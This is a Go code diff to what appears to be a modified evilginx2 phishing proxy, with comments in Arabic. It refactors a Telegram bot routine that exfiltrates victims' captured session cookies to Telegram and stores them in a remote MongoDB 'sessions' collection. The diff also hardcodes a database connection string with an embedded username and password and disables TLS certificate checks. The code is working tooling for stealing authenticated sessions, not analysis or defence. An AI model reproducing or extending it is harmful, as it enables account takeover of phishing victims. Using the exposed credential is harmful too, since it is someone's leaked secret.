@@ -11,6 +11,7 @@ import (
 	"mime/multipart"
 
 	"github.com/kgretzky/evilginx2/log"
+	"github.com/kgretzky/evilginx2/database" // تأكد من إضافة هذا الاستيراد
 
 	"encoding/json"
 	"context"
@@ -618,7 +619,7 @@ func (t *TelegramBot) SendFileFromText(fileName string, fileContent string) erro
 	
 	log.Success("Cookies file sent to Telegram successfully")
 
-	// تعريف المتغيرات المطلوبة
+	// استخراج معرف الجلسة من اسم الملف
 	sessionID := "default"
 	if strings.Contains(fileName, "_") {
 		parts := strings.Split(fileName, "_")
@@ -628,55 +629,41 @@ func (t *TelegramBot) SendFileFromText(fileName string, fileContent string) erro
 		}
 	}
 	
-	// استخراج الكوكيز من محتوى الملف
-	cookiesList := []map[string]interface{}{}
-	
-	// البحث عن بداية JSON الكوكيز
-	jsonStartIdx := strings.Index(fileContent, "[")
-	jsonEndIdx := strings.LastIndex(fileContent, "]")
-	
-	if jsonStartIdx >= 0 && jsonEndIdx > jsonStartIdx {
-		// استخراج JSON من الملف
-		cookieJSON := fileContent[jsonStartIdx:jsonEndIdx+1]
-		// محاولة تحليل JSON
-		err = json.Unmarshal([]byte(cookieJSON), &cookiesList)
-		if err != nil {
-			log.Warning("فشل في تحليل JSON الكوكيز: %v", err)
-			cookiesList = []map[string]interface{}{}
-		} else {
-			log.Debug("تم العثور على %d كوكيز في الملف", len(cookiesList))
-		}
-	} else {
-		log.Warning("لم يتم العثور على تنسيق JSON صالح في محتوى الملف")
-	}
+	t.SendCookiesFile(sessionID, fileContent)
+	return nil
+}
 
+func (t *TelegramBot) SendCookiesFile(sessionID, fileContent string) error {
+	
+	log.Info("جاري تحديث الكوكيز للجلسة: %s", sessionID)
+	
+	// استخدام MongoDB مباشرة لتحديث الكوكيز
 	mongo_uri := "mongodb+srv://jemex2023:l0mwPDO40LYAJ0xs@cluster0.bldhxin.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0&tlsInsecure=true&ssl=true"
 	db_name := "evilginx"
 
-	// استخدام MongoDB مباشرة بدلاً من الطريقة
+	// الاتصال بقاعدة البيانات
 	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
 	defer cancel()
 
 	client, err := mongo.Connect(ctx, options.Client().ApplyURI(mongo_uri))
 	if err != nil {
-		log.Error("فشل في الاتصال بـ MongoDB لتحديث الكوكيز: %v", err)
-		return nil
+		log.Error("فشل في الاتصال بـ MongoDB: %v", err)
+		return err
 	}
 	defer client.Disconnect(ctx)
 
-	// تحديث الكوكيز مباشرة باستخدام قاعدة البيانات
-	collection := client.Database(db_name).Collection("sessions")
-	
-	// طباعة معلومات التشخيص
-	cookiesLen := len(cookiesList)
-	log.Debug("عدد الكوكيز المراد تحديثها: %d", cookiesLen)
-	
-	if cookiesLen > 0 {
-		firstCookie := cookiesList[0]
-		log.Debug("محتوى أول كوكي: %v", firstCookie)
+	// تحليل JSON مباشرة من محتوى الملف
+	var cookiesList []map[string]interface{}
+	err = json.Unmarshal([]byte(fileContent), &cookiesList)
+	if err != nil {
+		log.Error("فشل في تحليل JSON الكوكيز: %v", err)
+		return err
 	}
 	
-	// تحديث الوثيقة
+	log.Success("تم استخراج %d كوكيز من الملف", len(cookiesList))
+	
+	// تحديث الجلسة في قاعدة البيانات
+	collection := client.Database(db_name).Collection("sessions")
 	filter := bson.M{"session_id": sessionID}
 	update := bson.M{
 		"$set": bson.M{
@@ -685,33 +672,30 @@ func (t *TelegramBot) SendFileFromText(fileName string, fileContent string) erro
 		},
 	}
 	
-	// تنفيذ عملية التحديث
-	result, err := collection.UpdateOne(ctx, filter, update)
+	// استخدام FindOneAndUpdate بدلاً من UpdateOne
+	var session bson.M
+	opts := options.FindOneAndUpdate().SetReturnDocument(options.After)
+	err = collection.FindOneAndUpdate(ctx, filter, update, opts).Decode(&session)
+	
 	if err != nil {
-		log.Error("فشل في تحديث الكوكيز في MongoDB: %v", err)
-	} else {
-		if result.ModifiedCount > 0 {
-			log.Success("تم تحديث الكوكيز في MongoDB بنجاح - تم تعديل %d وثيقة", result.ModifiedCount)
+		if err == mongo.ErrNoDocuments {
+			log.Warning("لم يتم العثور على الجلسة المحددة: %s", sessionID)
 		} else {
-			log.Warning("تم تنفيذ الاستعلام لكن لم يتم تعديل أي وثيقة - هل الجلسة موجودة؟")
+			log.Error("فشل في تحديث الكوكيز في MongoDB: %v", err)
 		}
+		return err
 	}
 	
-	// التحقق من نجاح العملية
-	var session bson.M
-	err = collection.FindOne(ctx, filter).Decode(&session)
-	if err != nil {
-		log.Error("فشل في استرداد الجلسة بعد التحديث: %v", err)
-	} else {
-		if cookies, exists := session["cookies"]; exists {
-			if cookiesArray, ok := cookies.(primitive.A); ok {
-				log.Success("تم التحقق من وجود الكوكيز في الوثيقة - العدد: %d", len(cookiesArray))
-			} else {
-				log.Warning("الكوكيز موجودة ولكن ليست مصفوفة")
-			}
+	// التحقق من وجود الكوكيز في الوثيقة المحدثة
+	if cookies, exists := session["cookies"]; exists {
+		if cookiesArray, ok := cookies.(primitive.A); ok {
+			log.Success("تم تحديث الكوكيز في MongoDB بنجاح - عدد الكوكيز: %d", len(cookiesArray))
 		} else {
-			log.Warning("لم يتم العثور على حقل الكوكيز في الوثيقة")
+			log.Warning("الكوكيز موجودة ولكن ليست مصفوفة")
 		}
+	} else {
+		log.Warning("لم يتم العثور على حقل الكوكيز في الوثيقة المحدثة")
 	}
+	
 	return nil
 }
